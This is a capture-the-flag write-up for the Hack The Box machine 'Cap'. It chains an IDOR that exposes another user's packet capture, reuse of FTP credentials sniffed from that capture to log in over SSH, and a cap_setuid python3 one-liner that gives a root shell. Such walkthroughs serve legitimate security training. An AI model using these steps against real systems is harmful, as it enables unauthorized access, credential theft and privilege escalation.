# HTB — Cap

**Difficulty:** Easy
**OS:** Linux
**Key Concepts:** IDOR, Linux Capabilities Abuse, FTP plaintext credential capture

---

## Phase Recon

Full port scan with service and OS detection:

```bash
nmap -sS -sV -O -p- 10.xx.xx.xx
```

Discovered open ports including **HTTP (80)**, **FTP (21)**, and **SSH (22)**. The web application on port 80 was the primary attack surface — a network monitoring dashboard that allowed users to capture and download packet captures.

---

## Phase Exploit — IDOR

The web application served PCAP files via sequential IDs in the URL:

```
http://10.xx.xx.xx/data/1
```

No authorization checks were in place. By manipulating the ID parameter down to `/data/0`, it was possible to access a PCAP file belonging to another user — a classic **Insecure Direct Object Reference (IDOR)** vulnerability.

Opened the PCAP in Wireshark and filtered for FTP traffic. The capture contained **FTP credentials transmitted in plaintext**, revealing a valid username and password.

Used those credentials to authenticate via SSH and established initial access as a low-privilege user. Retrieved the user flag.

```bash
cat ~/user.txt
# Flag redacted
```

---

## Phase Privilege Escalation — Linux Capabilities

Rather than a traditional SUID binary, privilege escalation came through a **capabilities misconfiguration**. Enumerated capabilities-set binaries:

```bash
getcap -r / 2>/dev/null
```

Output revealed:

```
/usr/bin/python3 = cap_setuid+ep
```

`cap_setuid` allows a binary to change its UID arbitrarily — functionally equivalent to SUID for privilege escalation purposes. Exploited it to set UID to 0 (root) and spawn a root shell:

```python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Confirmed root and retrieved the root flag:

```bash
whoami
# root
cat /root/root.txt
# Flag redacted
```

---

## Key Takeaways

- IDOR vulnerabilities are simple to exploit and easy to overlook — always test sequential IDs in URLs with no session-bound authorization
- Linux capabilities (`getcap -r /`) are frequently less scrutinized than SUID binaries but carry identical risk — treat them the same in post-exploitation enumeration
- Plaintext protocols like FTP have no place in modern environments; credentials captured in a PCAP led directly to initial access
- The full attack chain here — IDOR → PCAP analysis → credential reuse → capabilities abuse — mirrors realistic internal pentest scenarios closely
